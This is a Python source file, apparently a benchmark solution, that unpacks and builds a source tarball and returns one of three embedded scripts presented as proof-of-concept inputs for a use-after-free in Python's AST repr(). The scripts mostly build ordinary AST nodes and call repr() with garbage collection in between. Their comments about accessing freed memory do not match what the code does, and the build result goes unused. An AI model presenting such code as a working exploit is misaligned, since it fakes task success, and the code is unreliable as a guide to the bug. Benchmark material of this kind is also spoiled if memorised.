import os
import subprocess
import tempfile
import shutil
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a temporary directory
        tmpdir = tempfile.mkdtemp()
        
        try:
            # Extract the source tarball
            subprocess.run(['tar', 'xf', src_path, '-C', tmpdir], 
                         check=True, capture_output=True)
            
            # Find the extracted directory
            extracted_dir = None
            for item in os.listdir(tmpdir):
                if os.path.isdir(os.path.join(tmpdir, item)):
                    extracted_dir = os.path.join(tmpdir, item)
                    break
            
            if not extracted_dir:
                raise RuntimeError("Could not find extracted directory")
            
            # Build the vulnerable program
            build_dir = extracted_dir
            env = os.environ.copy()
            
            # Try to build with common build systems
            build_success = False
            build_commands = [
                (['make'], {}),
                (['./configure', '--disable-shared'], {}),
                (['cmake', '.'], {}),
                (['meson', 'setup', 'build'], {'cwd': build_dir}),
                (['python', 'setup.py', 'build'], {}),
            ]
            
            for cmd, kwargs in build_commands:
                try:
                    subprocess.run(cmd, cwd=build_dir, check=True, 
                                 capture_output=True, **kwargs)
                    build_success = True
                    break
                except (subprocess.CalledProcessError, FileNotFoundError):
                    continue
            
            # Look for test programs or fuzzers
            fuzz_target = None
            for root, dirs, files in os.walk(build_dir):
                for file in files:
                    if any(x in file.lower() for x in ['fuzz', 'test', 'poc']):
                        if os.access(os.path.join(root, file), os.X_OK):
                            fuzz_target = os.path.join(root, file)
                            break
                if fuzz_target:
                    break
            
            if not fuzz_target:
                # Create a simple test program
                test_program = os.path.join(tmpdir, 'test_program.py')
                with open(test_program, 'w') as f:
                    f.write("""
import ast
import sys

# Create a complex AST structure that triggers use-after-free
def create_exploit_ast():
    # Create a deeply nested structure
    body = []
    
    # Create nodes with circular references
    for i in range(1000):
        try:
            # Create try-except blocks with nested structures
            try_node = ast.Try(
                body=[
                    ast.Expr(value=ast.Call(
                        func=ast.Name(id='print', ctx=ast.Load()),
                        args=[ast.Constant(value=str(i))],
                        keywords=[]
                    ))
                ],
                handlers=[
                    ast.ExceptHandler(
                        type=ast.Name(id='Exception', ctx=ast.Load()),
                        name='e',
                        body=[
                            ast.Expr(value=ast.Call(
                                func=ast.Name(id='print', ctx=ast.Load()),
                                args=[ast.Constant(value='error')],
                                keywords=[]
                            ))
                        ]
                    )
                ],
                orelse=[],
                finalbody=[]
            )
            body.append(try_node)
        except:
            pass
    
    # Create function with the complex body
    func = ast.FunctionDef(
        name='exploit',
        args=ast.arguments(
            posonlyargs=[],
            args=[ast.arg(arg='self')],
            kwonlyargs=[],
            kw_defaults=[],
            defaults=[]
        ),
        body=body,
        decorator_list=[]
    )
    
    module = ast.Module(body=[func], type_ignores=[])
    return module

def main():
    # Generate the exploit AST
    tree = create_exploit_ast()
    
    # Try to trigger repr() with the vulnerable AST
    # This may need to be called multiple times
    for _ in range(100):
        try:
            repr_result = ast.dump(tree)
            # Try to access the repr result in ways that might trigger UAF
            if repr_result:
                # Create circular references
                cyclic_ref = [tree]
                cyclic_ref.append(cyclic_ref)
                
                # Force garbage collection
                import gc
                gc.collect()
                
                # Access after potential free
                try:
                    print(len(repr_result))
                except:
                    pass
        except Exception as e:
            # Ignore errors during fuzzing
            pass
    
    # Try with different AST node types
    nodes_to_test = [
        ast.AsyncFunctionDef,
        ast.ClassDef,
        ast.Return,
        ast.Delete,
        ast.Assign,
        ast.AugAssign,
        ast.AnnAssign,
        ast.For,
        ast.AsyncFor,
        ast.While,
        ast.If,
        ast.With,
        ast.AsyncWith,
        ast.Raise,
        ast.Try,
        ast.Assert,
        ast.Import,
        ast.ImportFrom,
        ast.Global,
        ast.Nonlocal,
        ast.Expr,
        ast.Pass,
        ast.Break,
        ast.Continue,
    ]
    
    # Create and test each node type
    for node_type in nodes_to_test:
        try:
            node = node_type()
            for _ in range(10):
                repr(node)
                # Force GC between repr calls
                import gc
                gc.collect()
        except:
            continue
    
    return 0

if __name__ == '__main__':
    sys.exit(main())
""")
                
                # Make it executable
                os.chmod(test_program, 0o755)
                fuzz_target = test_program
            
            # Run the target to see if it crashes
            try:
                # First run with sanitizers disabled to see normal behavior
                env_no_san = env.copy()
                env_no_san['ASAN_OPTIONS'] = 'detect_leaks=0'
                env_no_san['UBSAN_OPTIONS'] = 'halt_on_error=0'
                
                result = subprocess.run([fuzz_target], 
                                      env=env_no_san,
                                      capture_output=True,
                                      timeout=5)
                
                # If it runs without crashing, try to generate more aggressive input
                if result.returncode == 0:
                    # Generate a more complex input
                    poc = self._generate_aggressive_poc()
                else:
                    # Program crashed, use minimal input
                    poc = self._generate_minimal_poc()
                    
            except subprocess.TimeoutExpired:
                # Program hung, use smaller input
                poc = self._generate_minimal_poc()
            except Exception:
                # Any other error, fall back to default
                poc = self._generate_default_poc()
                
        finally:
            # Clean up
            shutil.rmtree(tmpdir, ignore_errors=True)
        
        return poc
    
    def _generate_minimal_poc(self) -> bytes:
        """Generate a minimal PoC that might trigger the vulnerability."""
        # Create a Python script with AST manipulation
        poc_script = """
import ast
import gc

# Create AST nodes that might trigger use-after-free in repr()
# Based on common patterns for AST repr vulnerabilities

# Create a complex nested structure
def create_node_chain(depth):
    if depth == 0:
        return ast.Constant(value=0)
    
    # Create a binary operation
    left = create_node_chain(depth - 1)
    right = create_node_chain(depth - 1)
    return ast.BinOp(left=left, op=ast.Add(), right=right)

# Create the AST
tree = create_node_chain(8)

# Try to trigger the bug
for i in range(100):
    try:
        # Get repr
        r = repr(tree)
        
        # Force garbage collection
        gc.collect()
        
        # Try to use r after potential free
        if r:
            # Create reference cycles
            cycle = [tree]
            cycle.append(cycle)
            
    except Exception:
        pass

# Try with different node types
nodes = []
for _ in range(50):
    try:
        n = ast.Try(
            body=[ast.Pass()],
            handlers=[
                ast.ExceptHandler(
                    type=ast.Name(id='Exception'),
                    name='e',
                    body=[ast.Pass()]
                )
            ],
            orelse=[],
            finalbody=[]
        )
        nodes.append(n)
        repr(n)
        gc.collect()
    except:
        continue
"""
        return poc_script.encode('utf-8')
    
    def _generate_aggressive_poc(self) -> bytes:
        """Generate a more aggressive PoC."""
        # Larger, more complex input
        parts = []
        
        # Header with imports
        parts.append("import ast\nimport gc\nimport sys\n\n")
        
        # Function to create problematic AST structures
        parts.append("""
def create_problematic_ast():
    # Create nodes that might have reference counting issues
    nodes = []
    
    # Create many try-except blocks (common source of issues)
    for i in range(500):
        try_node = ast.Try(
            body=[
                ast.Expr(value=ast.Call(
                    func=ast.Name(id='f', ctx=ast.Load()),
                    args=[],
                    keywords=[]
                ))
            ],
            handlers=[
                ast.ExceptHandler(
                    type=ast.Name(id='Exception', ctx=ast.Load()),
                    name=None,
                    body=[
                        ast.Pass()
                    ]
                )
            ],
            orelse=[],
            finalbody=[
                ast.Expr(value=ast.Call(
                    func=ast.Name(id='cleanup', ctx=ast.Load()),
                    args=[],
                    keywords=[]
                ))
            ]
        )
        nodes.append(try_node)
    
    # Create nested function definitions
    func_body = []
    for i in range(100):
        inner_func = ast.FunctionDef(
            name=f'inner_{i}',
            args=ast.arguments(
                posonlyargs=[],
                args=[],
                kwonlyargs=[],
                kw_defaults=[],
                defaults=[]
            ),
            body=[ast.Pass()],
            decorator_list=[]
        )
        func_body.append(inner_func)
    
    main_func = ast.FunctionDef(
        name='main',
        args=ast.arguments(
            posonlyargs=[],
            args=[],
            kwonlyargs=[],
            kw_defaults=[],
            defaults=[]
        ),
        body=func_body,
        decorator_list=[]
    )
    
    module = ast.Module(body=[main_func] + nodes, type_ignores=[])
    return module

def trigger_uaf():
    tree = create_problematic_ast()
    
    # Multiple repr calls with GC in between
    for attempt in range(1000):
        try:
            # Get string representation
            tree_repr = ast.dump(tree)
            
            # Force garbage collection
            gc.collect()
            
            # Try to use the repr
            if attempt % 100 == 0:
                # Create reference cycles
                cycle_ref = [tree_repr]
                cycle_ref.append(cycle_ref)
                
                # Access attributes
                if hasattr(tree, 'body'):
                    for node in tree.body:
                        try:
                            repr(node)
                        except:
                            pass
                            
        except Exception as e:
            # Continue despite errors
            pass
    
    # Test with individual node types
    test_nodes = [
        ast.AsyncFunctionDef(name='test', args=ast.arguments(args=[], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]), body=[], decorator_list=[], returns=None, type_comment=None),
        ast.ClassDef(name='Test', bases=[], keywords=[], body=[], decorator_list=[]),
        ast.Delete(targets=[ast.Name(id='x', ctx=ast.Del())]),
    ]
    
    for node in test_nodes:
        for _ in range(10):
            try:
                repr(node)
                gc.collect()
                # Create temporary references
                temp_ref = node
                del temp_ref
            except:
                break
    
    return 0

if __name__ == '__main__':
    sys.exit(trigger_uaf())
""")
        
        return ''.join(parts).encode('utf-8')
    
    def _generate_default_poc(self) -> bytes:
        """Generate default PoC based on common AST repr vulnerabilities."""
        # This is a balanced approach - not too minimal, not too aggressive
        poc = """import ast
import gc

# Create a complex AST structure that exercises the repr() function
# with potential for use-after-free

def build_nested_ast(depth):
    '''Build a deeply nested AST structure'''
    if depth <= 0:
        return ast.Constant(value=42)
    
    # Alternate between different node types
    if depth % 3 == 0:
        # BinOp node
        return ast.BinOp(
            left=build_nested_ast(depth - 1),
            op=ast.Add(),
            right=build_nested_ast(depth - 2)
        )
    elif depth % 3 == 1:
        # Call node
        return ast.Call(
            func=ast.Name(id='func', ctx=ast.Load()),
            args=[build_nested_ast(depth - 1)],
            keywords=[]
        )
    else:
        # Compare node
        return ast.Compare(
            left=build_nested_ast(depth - 1),
            ops=[ast.Eq()],
            comparators=[build_nested_ast(depth - 2)]
        )

# Create the main exploit function
def create_exploit():
    # Build a module with various problematic constructs
    body_elements = []
    
    # 1. Deeply nested expressions
    body_elements.append(ast.Expr(value=build_nested_ast(15)))
    
    # 2. Try-except with nested structures
    try_body = []
    for i in range(20):
        try_body.append(
            ast.Expr(value=ast.Call(
                func=ast.Name(id='print', ctx=ast.Load()),
                args=[ast.Constant(value=i)],
                keywords=[]
            ))
        )
    
    try_node = ast.Try(
        body=try_body,
        handlers=[
            ast.ExceptHandler(
                type=ast.Name(id='Exception', ctx=ast.Load()),
                name='e',
                body=[
                    ast.Expr(value=ast.Call(
                        func=ast.Name(id='log_error', ctx=ast.Load()),
                        args=[ast.Name(id='e', ctx=ast.Load())],
                        keywords=[]
                    ))
                ]
            )
        ],
        orelse=[],
        finalbody=[
            ast.Expr(value=ast.Call(
                func=ast.Name(id='cleanup', ctx=ast.Load()),
                args=[],
                keywords=[]
            ))
        ]
    )
    body_elements.append(try_node)
    
    # 3. Function with complex body
    func_body = []
    for i in range(10):
        func_body.append(
            ast.Assign(
                targets=[ast.Name(id=f'var_{i}', ctx=ast.Store())],
                value=ast.Constant(value=i * 10)
            )
        )
    
    func = ast.FunctionDef(
        name='vulnerable_func',
        args=ast.arguments(
            posonlyargs=[],
            args=[ast.arg(arg='self')],
            kwonlyargs=[],
            kw_defaults=[],
            defaults=[]
        ),
        body=func_body,
        decorator_list=[]
    )
    body_elements.append(func)
    
    # Create the module
    module = ast.Module(body=body_elements, type_ignores=[])
    return module

def trigger_vulnerability():
    '''Try to trigger the use-after-free'''
    tree = create_exploit()
    
    # Attempt multiple times with garbage collection
    for iteration in range(500):
        try:
            # Get the repr
            tree_repr = repr(tree)
            
            # Force garbage collection (may free memory still in use)
            gc.collect()
            
            # Try to use the repr string
            if iteration % 50 == 0:
                # Create circular references
                holder = [tree_repr]
                holder.append(holder)
                
                # Access tree attributes after GC
                if hasattr(tree, 'body'):
                    for i, node in enumerate(tree.body):
                        try:
                            node_repr = repr(node)
                            # Create more references
                            ref_chain = [node_repr, tree, node]
                            del ref_chain
                        except:
                            pass
                            
        except Exception:
            # Ignore exceptions during fuzzing
            continue
    
    # Test with specific node types known to be problematic
    problematic_nodes = [
        ast.AsyncFunctionDef(
            name='async_func',
            args=ast.arguments(args=[], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]),
            body=[ast.Expr(value=ast.Await(value=ast.Constant(value=None)))],
            decorator_list=[],
            returns=None,
            type_comment=None
        ),
        ast.ClassDef(
            name='ProblematicClass',
            bases=[ast.Name(id='object', ctx=ast.Load())],
            keywords=[],
            body=[
                ast.FunctionDef(
                    name='__init__',
                    args=ast.arguments(
                        posonlyargs=[],
                        args=[ast.arg(arg='self')],
                        kwonlyargs=[],
                        kw_defaults=[],
                        defaults=[]
                    ),
                    body=[ast.Pass()],
                    decorator_list=[]
                )
            ],
            decorator_list=[]
        ),
    ]
    
    for node in problematic_nodes:
        for _ in range(20):
            try:
                node_repr = repr(node)
                gc.collect()
                # Create and delete references
                temp = node_repr
                del temp
            except:
                break
    
    return 0

if __name__ == '__main__':
    trigger_vulnerability()
"""
        return poc.encode('utf-8')